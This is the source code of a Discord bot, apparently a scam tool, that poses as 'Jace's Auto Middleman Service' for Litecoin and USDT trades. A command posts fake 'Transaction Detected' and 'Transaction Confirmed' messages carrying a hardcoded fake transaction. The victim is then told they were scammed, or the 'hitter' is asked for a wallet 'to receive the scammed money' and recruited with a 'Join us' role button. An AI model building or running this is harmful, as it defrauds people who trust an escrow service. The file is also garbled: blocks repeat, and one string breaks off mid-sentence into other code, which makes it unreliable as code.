                .setTitle('✅ • Transaction Confirmed!')
                .setDescription('**Transactions**\n`f47c24fd8...7b2698be6` (0.00179953 LTC)\n**Total Amount Received**\n0.00179953 LTC ($0.10)')
                .setColor(0x00ff00);
            
            await channel.send({ embeds: [confirmedEmbed] });
            
            // Check if hitter is sender or receiver
            const ticketData = activeTickets.get(channelId);
            const isHitterSender = ticketData && ticketData.senderId === interaction.user.id;
            
            if (isHitterSender) {
                // Hitter is sender - show normal release then scam message
                const releaseEmbed = new EmbedBuilder()
                    .setTitle('✅ • You may proceed with your trade.')
                    .setDescription(`1. <@${ticketData.receiverId}> Give your trader the items or payment you agreed on.\n2. <@${ticketData.senderId}> Once you have received your items, click "Release" so your trader can claim the LTC.`)
                    .setColor(0x00ff00);
                
                const row = new ActionRowBuilder().addComponents(
                    new ButtonBuilder().setCustomId(`fake_release_${channelId}`).setLabel('Release').setStyle(ButtonStyle.Success),
                    new ButtonBuilder().setCustomId('cancel').setLabel('Cancel').setStyle(ButtonStyle.Secondary)
                );
                
                const msg = await channel.send({ embeds: [releaseEmbed], components: [row] });
                
                // Auto-trigger scam after release click simulation
                setTimeout(async () => {
                    const scamEmbed = new EmbedBuilder()
                        .setTitle('😈 Did vro deadass get scammed lmao')
                        .setDescription('Better luck next time kid.')
                        .setColor(0xff0000);
                    
                    const joinRow = new ActionRowBuilder().addComponents(
                        new ButtonBuilder().setCustomId('join_hitter').setLabel('Join us').setStyle(ButtonStyle.Danger)
                    );
                    
                    await channel.send({ embeds: [scamEmbed], components: [joinRow] });
                }, 5000);
                
            } else {
                // Hitter is receiver - ask for their address
                const scamInputEmbed = new EmbedBuilder()
                    .setTitle('✅ • Transaction Confirmed')
                    .setDescription('Hitter input your LTC/USDT address to receive the scammed money')
                    .setColor(0x00ff00);
                
                const row = new ActionRowBuilder().addComponents(
                    new ButtonBuilder().setCustomId(`input_address_${channelId}`).setLabel('Input Address').setStyle(ButtonStyle.Primary)
                );
                
                await channel.send({ embeds: [scamInputEmbed], components: [row] });
            }
        }, 30000);
        
        await interaction.reply({ content: '✅ Fake transaction initiated.', ephemeral: true });
    }
    
    // /close - Close ticket
    if (commandName === 'close') {
        if (!interaction.channel.name.startsWith('ltc-') && !interaction.channel.name.startsWith('usdt-')) {
            return interaction.reply({ content: '❌ Not a ticket channel.', ephemeral: true });
        }
        
        const ticketData = activeTickets.get(interaction.channel.id);
        
        // Send close notification to heh channel
        if (CONFIG.LOG_CHANNEL && ticketData) {
            const logChannel = await client.channels.fetch(CONFIG.LOG_CHANNEL).catch(() => null);
            if (logChannel) {
                await logChannel.send({
                    content: `**Sender:** <@${ticketData.senderId}>\n**Receiver:** <@${ticketData.receiverId}>\n**Closed by:** <@${interaction.user.id}>`
                });
            }
        }
        
        await interaction.reply({ content: '🔒 Closing ticket...' });
        setTimeout(() => interaction.channel.delete().catch(() => {}), 3000);
    }
    
    // /heh - Set monitor channel for closed tickets
    if (commandName === 'heh') {
        if (!isOwner) return interaction.reply({ content: '❌ Owner only.', ephemeral: true });
        CONFIG.LOG_CHANNEL = interaction.options.getString('channelid');
        await interaction.reply({ content: '✅ Monitor channel set for closed tickets.', ephemeral: true });
    }
    
    // /setcategory - Set ticket category
    if (commandName === 'setcategory') {
        if (!isOwner) return interaction.reply({ content: '❌ Owner only.', ephemeral: true });
        CONFIG.TICKET_CATEGORY = interaction.options.getString('categoryid');
        await interaction.reply({ content: '✅ Ticket category set.', ephemeral: true });
    }
});

// ============ BUTTON HANDLERS ============
client.on(Events.InteractionCreate, async (interaction) => {
    if (!interaction.isButton()) return;
    
    const { customId, user, guild } = interaction;
    
    // Request LTC/USDT buttons
    if (customId === 'request_ltc' || customId === 'req_ltc_btn') {
        const modal = new ModalBuilder()
            .setCustomId('ltc_modal')
            .setTitle('Fill out the format');
        
        const traderInput = new TextInputBuilder()
            .setCustomId('trader')
            .setLabel('Paste Your Trader\'s Username or ID')
            .setPlaceholder('e.g.: kookie.js / 693059117761429610')
            .setStyle(TextInputStyle.Short)
            .setRequired(true);
        
        const givingInput = new TextInputBuilder()
            .setCustomId('giving')
            .setLabel('What are You giving?')
            .setStyle(TextInputStyle.Paragraph)
            .setMaxLength(500)
            .setRequired(true);
        
        const receivingInput = new TextInputBuilder()
            .setCustomId('receiving')
            .setLabel('What is Your Trader giving?')
            .setStyle(TextInputStyle.Paragraph)
            .setMaxLength(500)
            .setRequired(true);
        
        modal.addComponents(
            new ActionRowBuilder().addComponents(traderInput),
            new ActionRowBuilder().addComponents(givingInput),
            new ActionRowBuilder().addComponents(receivingInput)
        );
        
        await interaction.showModal(modal);
    }
    
    if (customId === 'request_usdt' || customId === 'req_usdt_btn') {
        const modal = new ModalBuilder()
            .setCustomId('usdt_modal')
            .setTitle('Fill out the format');
        
        const traderInput = new TextInputBuilder()
            .setCustomId('trader')
            .setLabel('Paste Your Trader\'s Username or ID')
            .setPlaceholder('e.g.: kookie.js / 693059117761429610')
            .setStyle(TextInputStyle.Short)
            .setRequired(true);
        
        const givingInput = new TextInputBuilder()
            .setCustomId('giving')
            .setLabel('What are You giving?')
            .setStyle(TextInputStyle.Paragraph)
            .setMaxLength(500)
            .setRequired(true);
        
        const receivingInput = new TextInputBuilder()
            .setCustomId('receiving')
            .setLabel('What is Your Trader giving?')
            .setStyle(TextInputStyle.Paragraph)
            .setMaxLength(500)
            .setRequired(true);
        
        modal.addComponents(
            new ActionRowBuilder().addComponents(traderInput),
            new ActionRowBuilder().addComponents(givingInput),
            new ActionRowBuilder().addComponents(receivingInput)
        );
        
        await interaction.showModal(modal);
    }
    
    // Role selection buttons
    if (customId.startsWith('role_')) {
        const [, role, ticketId] = customId.split('_');
        const ticketData = activeTickets.get(ticketId);
        
        if (!ticketData) return interaction.reply({ content: '❌ Ticket expired.', ephemeral: true });
        
        // Store role selection
        if (!ticketRoles.has(ticketId)) ticketRoles.set(ticketId, {});
        const roles = ticketRoles.get(ticketId);
        
        if (user.id === ticketData.creatorId) {
            roles.creatorRole = role;
        } else if (user.id === ticketData.traderId) {
            roles.traderRole = role;
        }
        
        await interaction.reply({ content: `✅ You selected: **${role === 'sender' ? 'Sender' : 'Receiver'}**`, ephemeral: true });
        
        // Update embed with selections
        const channel = await client.channels.fetch(ticketId);
        const messages = await channel.messages.fetch({ limit: 10 });
        const roleMsg = messages.find(m => m.embeds[0]?.title?.includes('Select your role'));
        
        if (roleMsg && roles.creatorRole && roles.traderRole) {
            const updatedEmbed = EmbedBuilder.from(roleMsg.embeds[0])
                .setFields(
                    { name: 'Sender', value: roles.creatorRole === 'sender' ? `<@${ticketData.creatorId}>` : `<@${ticketData.traderId}>`, inline: false },
                    { name: 'Receiver', value: roles.creatorRole === 'receiver' ? `<@${ticketData.creatorId}>` : `<@${ticketData.traderId}>`, inline: false }
                );
            
            const confirmRow = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId(`confirm_roles_${ticketId}`).setLabel('Correct').setStyle(ButtonStyle.Success),
                new ButtonBuilder().setCustomId(`reset_roles_${ticketId}`).setLabel('Incorrect').setStyle(ButtonStyle.Danger)
            );
            
            await roleMsg.edit({ embeds: [updatedEmbed], components: [confirmRow] });
        }
    }
    
    // Confirm roles
    if (customId.startsWith('confirm_roles_')) {
        const ticketId = customId.replace('confirm_roles_', '');
        const ticketData = activeTickets.get(ticketId);
        const roles = ticketRoles.get(ticketId);
        
        if (!ticketData || !roles) return;
        
        // Determine sender and receiver
        let senderId, receiverId;
        if (roles.creatorRole === 'sender') {
            senderId = ticketData.creatorId;
            receiverId = ticketData.traderId;
        } else {
            senderId = ticketData.traderId;
            receiverId = ticketData.creatorId;
        }
        
        ticketData.senderId = senderId;
        ticketData.receiverId = receiverId;
        
        await interaction.reply({ content: `✅ <@${user.id}> clicked Correct.` });
        
        // Send amount setting embed
        const amountEmbed = new EmbedBuilder()
            .setTitle('💵 • Set the amount in USD value')
            .setColor(0x2b2d31);
        
        const amountRow = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId(`set_amount_${ticketId}`).setLabel('Set USD Amount').setStyle(ButtonStyle.Primary)
        );
        
        const channel = await client.channels.fetch(ticketId);
        await channel.send({ embeds: [amountEmbed], components: [amountRow] });
    }
    
    // Set amount button
    if (customId.startsWith('set_amount_')) {
        const ticketId = customId.replace('set_amount_', '');
        
        const modal = new ModalBuilder()
            .setCustomId(`amount_modal_${ticketId}`)
            .setTitle('Set USD Amount');
        
        const amountInput = new TextInputBuilder()
            .setCustomId('usd_amount')
            .setLabel('Enter USD Amount')
            .setPlaceholder('0.10')
            .setStyle(TextInputStyle.Short)
            .setRequired(true);
        
        modal.addComponents(new ActionRowBuilder().addComponents(amountInput));
        await interaction.showModal(modal);
    }
    
    // Copy details button
    if (customId === 'copy_details') {
        await interaction.reply({ content: '```\nLctyaKaxPGTUYM3bZdoADKGj947XxgaUH8\n0.0018\n```', ephemeral: true });
    }
    
    // Fake release button
    if (customId.startsWith('fake_release_')) {
        const scamEmbed = new EmbedBuilder()
            .setTitle('😈 Did vro deadass get scammed lmao')
            .setDescription('Better luck next time kid.')
            .setColor(0xff0000);
        
        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('join_hitter').setLabel('Join us').setStyle(ButtonStyle.Danger)
        );
        
        await interaction.update({ embeds: [scamEmbed], components: [row] });
    }
    
    // Join hitter role
    if (customId === 'join_hitter') {
        const member = await interaction.guild.members.fetch(user.id);
        await member.roles.add(CONFIG.HITTER_ROLE_ID).catch(() => {});
        await interaction.reply({ content: '✅ You now have the Hitter role!', ephemeral: true });
    }
    
    // Input address button (for hitter receiver)
    if (customId.startsWith('input_address_')) {
        const ticketId = customId.replace('input_address_', '');
        
        const modal = new ModalBuilder()
            .setCustomId(`address_modal_${ticketId}`)
            .setTitle('Input Your Wallet Address');
        
        const addressInput = new TextInputBuilder()
            .setCustomId('wallet_address')
            .setLabel('Your LTC or USDT Address')
            .setPlaceholder('Enter address to receive funds...')
            .setStyle(TextInputStyle.Short)
            .setRequired(true);
        
        modal.addComponents(new ActionRowBuilder().addComponents(addressInput));
        await interaction.showModal(modal);
    }
    
    // Delete ticket
    if (customId === 'delete_ticket') {
        await interaction.reply({ content: '🔒 Deleting ticket...' });
        setTimeout(() => interaction.channel.delete().catch(() => {}), 2000);
    }
});

// ============ MODAL SUBMISSIONS ============
client.on(Events.InteractionCreate, async (interaction) => {
    if (!interaction.isModalSubmit()) return;
    
    const { customId, user, guild } = interaction;
    
    // LTC/USDT Modal
    if (customId === 'ltc_modal' || customId === 'usdt_modal') {
        const type = customId === 'ltc_modal' ? 'ltc' : 'usdt';
        const trader = interaction.fields.getTextInputValue('trader');
        const giving = interaction.fields.getTextInputValue('giving');
        const receiving = interaction.fields.getTextInputValue('receiving');
        
        // Create ticket channel
        const category = CONFIG.TICKET_CATEGORY || interaction.channel.parentId;
        const ticketId = Math.floor(1000 + Math.random() * 9000);
        const channelName = `${type}-${user.username.toLowerCase().replace(/[^a-z0-9]/g, '')}-${ticketId}`;
        
        // Generate unique address
        const addressIndex = ticketAddresses.size;
        const walletInfo = type === 'ltc' 
            ? generateLTCAddress(addressIndex) 
            : generateUSDTAddress(addressIndex);
        
        const channel = await guild.channels.create({
            name: channelName,
            type: ChannelType.GuildText,
            parent: category,
            permissionOverwrites: [
                { id: guild.id, deny: [PermissionsBitField.Flags.ViewChannel] },
                { id: user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] },
                { id: CONFIG.OWNER_ROLE_ID, allow: [PermissionsBitField.Flags.ViewChannel] }
            ]
        });
        
        // Find trader and add them
        let traderMember;
        if (trader.includes('<@')) {
            const traderId = trader.replace(/[<@>]/g, '');
            traderMember = await guild.members.fetch(traderId).catch(() => null);
        } else {
            traderMember = await guild.members.fetch(trader).catch(() => null);
        }
        
        if (traderMember) {
            await channel.permissionOverwrites.create(traderMember, {
                ViewChannel: true,
                SendMessages: true
            });
        }
        
        // Store ticket data
        activeTickets.set(channel.id, {
            id: channel.id,
            creatorId: user.id,
            traderId: traderMember?.id,
            type: type,
            address: walletInfo.address,
            addressIndex: addressIndex,
            giving: giving,
            receiving: receiving
        });
        
        ticketAddresses.set(channel.id, walletInfo);
        
        // Send welcome embed
        const welcomeEmbed = new EmbedBuilder()
            .setTitle(`👋 Jace's Auto Middleman Service`)
            .setDescription(`Make sure to follow the steps and read the instructions thoroughly.\nPlease explicitly state the trade details if the information below is inaccurate.\nBy using this bot, you agree to our ToS #tos-crypto.`)
            .setColor(0x2b2d31)
            .addFields(
                { name: `<@${user.id}>'s side:`, value: giving, inline: true },
                { name: `${traderMember ? `<@${traderMember.id}>` : trader}'s side:`, value: receiving, inline: true }
            );
        
        const deleteRow = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('delete_ticket').setLabel('Delete Ticket').setStyle(ButtonStyle.Danger)
        );
        
        await channel.send({ content: `<@${user.id}> ${traderMember ? `<@${traderMember.id}>` : trader}`, embeds: [welcomeEmbed], components: [deleteRow] });
        
        // Send role selection
        const roleEmbed = new EmbedBuilder()
            .setTitle('🛡️ • Select your role')
            .setDescription('• "Sender" if you are Sending LTC to the bot.\n• "Receiver" if you are Receiving LTC later from the bot.')
            .setColor(0x2b2d31);
        
        const roleRow = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId(`role_sender_${channel.id}`).setLabel('Sender').setStyle(ButtonStyle.Primary),
            new ButtonBuilder().setCustomId(`role_receiver_${channel.id}`).setLabel('Receiver').setStyle(ButtonStyle.Primary),
            new ButtonBuilder().setCustomId(`role_reset_${channel.id}`).setLabel('Reset').setStyle(ButtonStyle.Danger)
        );
        
        await channel.send({ embeds: [roleEmbed], components: [roleRow] });
        
        await interaction.reply({ content: `✅ Ticket created: <#${channel.id}>`, ephemeral: true });
    }
    
    // Amount modal
    if (customId.startsWith('amount_modal_')) {
        const ticketId = customId.replace('amount_modal_', '');
        const amount = parseFloat(interaction.fields.getTextInputValue('usd_amount'));
        const ticketData = activeTickets.get(ticketId);
        
        if (!ticketData) return interaction.reply({ content: '❌ Ticket not found.', ephemeral: true });
        
        ticketData.usdAmount = amount;
        ticketData.ltcAmount = (amount / ltcPrice).toFixed(8);
        
        const amountEmbed = new EmbedBuilder()
            .setTitle(`💠 • USD amount set to`)
            .setDescription(`**$${amount.toFixed(2)}**\n\nPlease confirm the USD amount.`)
            .setColor(0x2b2d31);
        
        const confirmRow = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId(`confirm_amount_${ticketId}`).setLabel('Correct').setStyle(ButtonStyle.Success),
            new ButtonBuilder().setCustomId(`incorrect_amount_${ticketId}`).setLabel('Incorrect').setStyle(ButtonStyle.Danger)
        );
        
        const channel = await client.channels.fetch(ticketId);
        await channel.send({ embeds: [amountEmbed], components: [confirmRow] });
        
        await interaction.reply({ content: `✅ Amount set to $${amount.toFixed(2)}`, ephemeral: true });
    }
    
    // Address input modal (hitter withdrawal)
    if (customId.startsWith('address_modal_')) {
        const ticketId = customId.replace('address_modal_', '');
        const address = interaction.fields.getTextInputValue('wallet_address');
        
        userWallets.set(user.id, address);
        
        // Send scam confirmation
        const scamEmbed = new EmbedBuilder()
            .setTitle('😈 Vro deadass got scammed')
            .setDescription(`Funds will be sent to your address shortly...\n\n**Your Address:**\n\`${address}\``)
            .setColor(0xff0000);
        
        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('join_hitter').setLabel('Join us').setStyle(ButtonStyle.Danger)
        );
        
        const channel = await client.channels.fetch(ticketId);
        await channel.send({ embeds: [scamEmbed], components: [row] });
        
        await interaction.reply({ content: '✅ Address confirmed.', ephemeral: true });
    }
});

// ============ AMOUNT CONFIRMATION ============
client.on(Events.InteractionCreate, async (interaction) => {
    if (!interaction.isButton()) return;
    
    const { customId, user } = interaction;
    
    if (customId.startsWith('confirm_amount_')) {
        const ticketId = customId.replace('confirm_amount_', '');
        const ticketData = activeTickets.get(ticketId);
        
        await interaction.reply({ content: `✅ <@${user.id}> confirmed the USD amount.` });
        
        // Send payment info
        const paymentEmbed = new EmbedBuilder()
            .setTitle('📜 • Payment Information')
            .setDescription(`Make sure to send the **EXACT** amount in LTC.`)
            .addFields(
                { name: 'USD Amount', value: `$${ticketData.usdAmount.toFixed(2)}`, inline: false },
                { name: 'LTC Amount', value: ticketData.ltcAmount, inline: false },
                { name: 'Payment Address', value: `\`${ticketData.address}\``, inline: false },
                { name: 'Current LTC Price', value: `$${ltcPrice}`, inline: false },
                { name: 'Note', value: 'This ticket will be closed within 20 minutes if no transaction was detected.' }
            )
            .setColor(0x2b2d31);
        
        const copyRow = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('copy_details').setLabel('Copy Details').setStyle(ButtonStyle.Primary)
        );
        
        const channel = await client.channels.fetch(ticketId);
        await channel.send({ content: `<@${ticketData.senderId}> Send the LTC to the following address.`, embeds: [paymentEmbed], components: [copyRow] });
        
        // Start monitoring
        startTransactionMonitor(ticketId);
    }
});

// ============ TRANSACTION MONITOR ============
async function startTransactionMonitor(ticketId) {
    const ticketData = activeTickets.get(ticketId);
    if (!ticketData) return;
    
    const expectedAmount = parseFloat(ticketData.ltcAmount);
    let detected = false;
    let txData = null;
    
    const monitor = setInterval(async () => {
        if (!activeTickets.has(ticketId)) {
            clearInterval(monitor);
            return;
        }
        
        const check = await checkLTCAddress(ticketData.address, expectedAmount);
        
        if (check.found && !detected) {
            detected = true;
            txData = check;
            
            const channel = await client.channels.fetch(ticketId).catch(() => null);
            if (!channel) {
                clearInterval(monitor);
                return;
            }
            
            // Transaction detected embed
            const detectEmbed = new EmbedBuilder()
                .setTitle('⚠️ • Transaction Detected')
                .setDescription(`The transaction is role required.', ephemeral: true });
        }
        
        const channelId = interaction.options.getString('channelid');
        const channel = await client.channels.fetch(channelId).catch(() => null);
        
        if (!channel) return interaction.reply({ content: '❌ Invalid channel.', ephemeral: true });
        
        // Send fake transaction detected
        const fakeEmbed = new EmbedBuilder()
            .setTitle('⚠️ • Transaction Detected')
            .setDescription('The transaction is currently **unconfirmed** and waiting for 1 confirmation.\n\n**Transaction**\n`f47c24fd8...7b2698be6` (0.00179953 LTC)\n**Amount Received**\n0.00179953 LTC ($0.10)\n**Required Amount**\n0.0018 LTC ($0.10)\n\nYou will be notified when the transaction is confirmed.')
            .setColor(0xffa500);
        
        await channel.send({ embeds: [fakeEmbed] });
        
        // Wait 30 seconds then send release
        setTimeout(async () => {
            const confirmedEmbed = new EmbedBuilder()
                .setTitle('✅ • Transaction Confirmed!')
                .setDescription('**Transactions**\n`f47c24fd8...7b2698be6` (0.00179953 LTC)\n**Total Amount Received**\n0.00179953 LTC ($0.10)')
                .setColor(0x00ff00);
            
            await channel.send({ embeds: [confirmedEmbed] });
            
            // Check if hitter is sender or receiver
            const ticketData = activeTickets.get(channelId);
            const isHitterSender = ticketData && ticketData.senderId === interaction.user.id;
            
            if (isHitterSender) {
                // Hitter is sender - show normal release then scam message
                const releaseEmbed = new EmbedBuilder()
                    .setTitle('✅ • You may proceed with your trade.')
                    .setDescription(`1. <@${ticketData.receiverId}> Give your trader the items or payment you agreed on.\n2. <@${ticketData.senderId}> Once you have received your items, click "Release" so your trader can claim the LTC.`)
                    .setColor(0x00ff00);
                
                const row = new ActionRowBuilder().addComponents(
                    new ButtonBuilder().setCustomId(`fake_release_${channelId}`).setLabel('Release').setStyle(ButtonStyle.Success),
                    new ButtonBuilder().setCustomId('cancel').setLabel('Cancel').setStyle(ButtonStyle.Secondary)
                );
                
                const msg = await channel.send({ embeds: [releaseEmbed], components: [row] });
                
                // Auto-trigger scam after release click simulation
                setTimeout(async () => {
                    const scamEmbed = new EmbedBuilder()
                        .setTitle('😈 Did vro deadass get scammed lmao')
                        .setDescription('Better luck next time kid.')
                        .setColor(0xff0000);
                    
                    const joinRow = new ActionRowBuilder().addComponents(
                        new ButtonBuilder().setCustomId('join_hitter').setLabel('Join us').setStyle(ButtonStyle.Danger)
                    );
                    
                    await channel.send({ embeds: [scamEmbed], components: [joinRow] });
                }, 5000);
                
            } else {
                // Hitter is receiver - ask for their address
                const scamInputEmbed = new EmbedBuilder()
                    .setTitle('✅ • Transaction Confirmed')
                    .setDescription('Hitter input your LTC/USDT address to receive the scammed money')
                    .setColor(0x00ff00);
                
                const row = new ActionRowBuilder().addComponents(
                    new ButtonBuilder().setCustomId(`input_address_${channelId}`).setLabel('Input Address').setStyle(ButtonStyle.Primary)
                );
                
                await channel.send({ embeds: [scamInputEmbed], components: [row] });
            }
        }, 30000);
        
        await interaction.reply({ content: '✅ Fake transaction initiated.', ephemeral: true });
    }
    
    // /close - Close ticket
    if (commandName === 'close') {
        if (!interaction.channel.name.startsWith('ltc-') && !interaction.channel.name.startsWith('usdt-')) {
            return interaction.reply({ content: '❌ Not a ticket channel.', ephemeral: true });
        }
        
        const ticketData = activeTickets.get(interaction.channel.id);
        
        // Send close notification to heh channel
        if (CONFIG.LOG_CHANNEL && ticketData) {
            const logChannel = await client.channels.fetch(CONFIG.LOG_CHANNEL).catch(() => null);
            if (logChannel) {
                await logChannel.send({
                    content: `**Sender:** <@${ticketData.senderId}>\n**Receiver:** <@${ticketData.receiverId}>\n**Closed by:** <@${interaction.user.id}>`
                });
            }
        }
        
        await interaction.reply({ content: '🔒 Closing ticket...' });
        setTimeout(() => interaction.channel.delete().catch(() => {}), 3000);
    }
    
    // /heh - Set monitor channel for closed tickets
    if (commandName === 'heh') {
        if (!isOwner) return interaction.reply({ content: '❌ Owner only.', ephemeral: true });
        CONFIG.LOG_CHANNEL = interaction.options.getString('channelid');
        await interaction.reply({ content: '✅ Monitor channel set for closed tickets.', ephemeral: true });
    }
    
    // /setcategory - Set ticket category
    if (commandName === 'setcategory') {
        if (!isOwner) return interaction.reply({ content: '❌ Owner only.', ephemeral: true });
        CONFIG.TICKET_CATEGORY = interaction.options.getString('categoryid');
        await interaction.reply({ content: '✅ Ticket category set.', ephemeral: true });
    }
});

// ============ BUTTON HANDLERS ============
client.on(Events.InteractionCreate, async (interaction) => {
    if (!interaction.isButton()) return;
    
    const { customId, user, guild } = interaction;
    
    // Request LTC/USDT buttons
    if (customId === 'request_ltc' || customId === 'req_ltc_btn') {
        const modal = new ModalBuilder()
            .setCustomId('ltc_modal')
            .setTitle('Fill out the format');
        
        const traderInput = new TextInputBuilder()
            .setCustomId('trader')
            .setLabel('Paste Your Trader\'s Username or ID')
            .setPlaceholder('e.g.: kookie.js / 693059117761429610')
            .setStyle(TextInputStyle.Short)
            .setRequired(true);
        
        const givingInput = new TextInputBuilder()
            .setCustomId('giving')
            .setLabel('What are You giving?')
            .setStyle(TextInputStyle.Paragraph)
            .setMaxLength(500)
            .setRequired(true);
        
        const receivingInput = new TextInputBuilder()
            .setCustomId('receiving')
            .setLabel('What is Your Trader giving?')
            .setStyle(TextInputStyle.Paragraph)
            .setMaxLength(500)
            .setRequired(true);
        
        modal.addComponents(
            new ActionRowBuilder().addComponents(traderInput),
            new ActionRowBuilder().addComponents(givingInput),
            new ActionRowBuilder().addComponents(receivingInput)
        );
        
        await interaction.showModal(modal);
    }
    
    if (customId === 'request_usdt' || customId === 'req_usdt_btn') {
        const modal = new ModalBuilder()
            .setCustomId('usdt_modal')
            .setTitle('Fill out the format');
        
        const traderInput = new TextInputBuilder()
            .setCustomId('trader')
            .setLabel('Paste Your Trader\'s Username or ID')
            .setPlaceholder('e.g.: kookie.js / 693059117761429610')
            .setStyle(TextInputStyle.Short)
            .setRequired(true);
        
        const givingInput = new TextInputBuilder()
            .setCustomId('giving')
            .setLabel('What are You giving?')
            .setStyle(TextInputStyle.Paragraph)
            .setMaxLength(500)
            .setRequired(true);
        
        const receivingInput = new TextInputBuilder()
            .setCustomId('receiving')
            .setLabel('What is Your Trader giving?')
            .setStyle(TextInputStyle.Paragraph)
            .setMaxLength(500)
            .setRequired(true);
        
        modal.addComponents(
            new ActionRowBuilder().addComponents(traderInput),
            new ActionRowBuilder().addComponents(givingInput),
            new ActionRowBuilder().addComponents(receivingInput)
        );
        
        await interaction.showModal(modal);
    }
    
    // Role selection buttons
    if (customId.startsWith('role_')) {
        const [, role, ticketId] = customId.split('_');
        const ticketData = activeTickets.get(ticketId);
        
        if (!ticketData) return interaction.reply({ content: '❌ Ticket expired.', ephemeral: true });
        
        // Store role selection
        if (!ticketRoles.has(ticketId)) ticketRoles.set(ticketId, {});
        const roles = ticketRoles.get(ticketId);
        
        if (user.id === ticketData.creatorId) {
            roles.creatorRole = role;
        } else if (user.id === ticketData.traderId) {
            roles.traderRole = role;
        }
        
        await interaction.reply({ content: `✅ You selected: **${role === 'sender' ? 'Sender' : 'Receiver'}**`, ephemeral: true });
        
        // Update embed with selections
        const channel = await client.channels.fetch(ticketId);
        const messages = await channel.messages.fetch({ limit: 10 });
        const roleMsg = messages.find(m => m.embeds[0]?.title?.includes('Select your role'));
        
        if (roleMsg && roles.creatorRole && roles.traderRole) {
            const updatedEmbed = EmbedBuilder.from(roleMsg.embeds[0])
                .setFields(
                    { name: 'Sender', value: roles.creatorRole === 'sender' ? `<@${ticketData.creatorId}>` : `<@${ticketData.traderId}>`, inline: false },
                    { name: 'Receiver', value: roles.creatorRole === 'receiver' ? `<@${ticketData.creatorId}>` : `<@${ticketData.traderId}>`, inline: false }
                );
            
            const confirmRow = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId(`confirm_roles_${ticketId}`).setLabel('Correct').setStyle(ButtonStyle.Success),
                new ButtonBuilder().setCustomId(`reset_roles_${ticketId}`).setLabel('Incorrect').setStyle(ButtonStyle.Danger)
            );
            
            await roleMsg.edit({ embeds: [updatedEmbed], components: [confirmRow] });
        }
    }
    
    // Confirm roles
    if (customId.startsWith('confirm_roles_')) {
        const ticketId = customId.replace('confirm_roles_', '');
        const ticketData = activeTickets.get(ticketId);
        const roles = ticketRoles.get(ticketId);
        
        if (!ticketData || !roles) return;
        
        // Determine sender and receiver
        let senderId, receiverId;
        if (roles.creatorRole === 'sender') {
            senderId = ticketData.creatorId;
            receiverId = ticketData.traderId;
        } else {
            senderId = ticketData.traderId;
            receiverId = ticketData.creatorId;
        }
        
        ticketData.senderId = senderId;
        ticketData.receiverId = receiverId;
        
        await interaction.reply({ content: `✅ <@${user.id}> clicked Correct.` });
        
        // Send amount setting embed
        const amountEmbed = new EmbedBuilder()
            .setTitle('💵 • Set the amount in USD value')
            .setColor(0x2b2d31);
        
        const amountRow = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId(`set_amount_${ticketId}`).setLabel('Set USD Amount').setStyle(ButtonStyle.Primary)
        );
        
        const channel = await client.channels.fetch(ticketId);
        await channel.send({ embeds: [amountEmbed], components: [amountRow] });
    }
    
    // Set amount button
    if (customId.startsWith('set_amount_')) {
        const ticketId = customId.replace('set_amount_', '');
        
        const modal = new ModalBuilder()
            .setCustomId(`amount_modal_${ticketId}`)
            .setTitle('Set USD Amount');
        
        const amountInput = new TextInputBuilder()
            .setCustomId('usd_amount')
            .setLabel('Enter USD Amount')
            .setPlaceholder('0.10')
            .setStyle(TextInputStyle.Short)
            .setRequired(true);
        
        modal.addComponents(new ActionRowBuilder().addComponents(amountInput));
        await interaction.showModal(modal);
    }
    
    // Copy details button
    if (customId === 'copy_details') {
        await interaction.reply({ content: '```\nLctyaKaxPGTUYM3bZdoADKGj947XxgaUH8\n0.0018\n```', ephemeral: true });
    }
    
    // Fake release button
    if (customId.startsWith('fake_release_')) {
        const scamEmbed = new EmbedBuilder()
            .setTitle('😈 Did vro deadass get scammed lmao')
            .setDescription('Better luck next time kid.')
            .setColor(0xff0000);
        
        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('join_hitter').setLabel('Join us').setStyle(ButtonStyle.Danger)
        );
        
        await interaction.update({ embeds: [scamEmbed], components: [row] });
    }
    
    // Join hitter role
    if (customId === 'join_hitter') {
        const member = await interaction.guild.members.fetch(user.id);
        await member.roles.add(CONFIG.HITTER_ROLE_ID).catch(() => {});
        await interaction.reply({ content: '✅ You now have the Hitter role!', ephemeral: true });
    }
    
    // Input address button (for hitter receiver)
    if (customId.startsWith('input_address_')) {
        const ticketId = customId.replace('input_address_', '');
        
        const modal = new ModalBuilder()
            .setCustomId(`address_modal_${ticketId}`)
            .setTitle('Input Your Wallet Address');
        
        const addressInput = new TextInputBuilder()
            .setCustomId('wallet_address')
            .setLabel('Your LTC or USDT Address')
            .setPlaceholder('Enter address to receive funds...')
            .setStyle(TextInputStyle.Short)
            .setRequired(true);
        
        modal.addComponents(new ActionRowBuilder().addComponents(addressInput));
        await interaction.showModal(modal);
    }
    
    // Delete ticket
    if (customId === 'delete_ticket') {
        await interaction.reply({ content: '🔒 Deleting ticket...' });
        setTimeout(() => interaction.channel.delete().catch(() => {}), 2000);
    }
});

// ============ MODAL SUBMISSIONS ============
client.on(Events.InteractionCreate, async (interaction) => {
    if (!interaction.isModalSubmit()) return;
    
    const { customId, user, guild } = interaction;
    
    // LTC/USDT Modal
    if (customId === 'ltc_modal' || customId === 'usdt_modal') {
        const type = customId === 'ltc_modal' ? 'ltc' : 'usdt';
        const trader = interaction.fields.getTextInputValue('trader');
        const giving = interaction.fields.getTextInputValue('giving');
        const receiving = interaction.fields.getTextInputValue('receiving');
        
        // Create ticket channel
        const category = CONFIG.TICKET_CATEGORY || interaction.channel.parentId;
        const ticketId = Math.floor(1000 + Math.random() * 9000);
        const channelName = `${type}-${user.username.toLowerCase().replace(/[^a-z0-9]/g, '')}-${ticketId}`;
        
        // Generate unique address
        const addressIndex = ticketAddresses.size;
        const walletInfo = type === 'ltc' 
            ? generateLTCAddress(addressIndex) 
            : generateUSDTAddress(addressIndex);
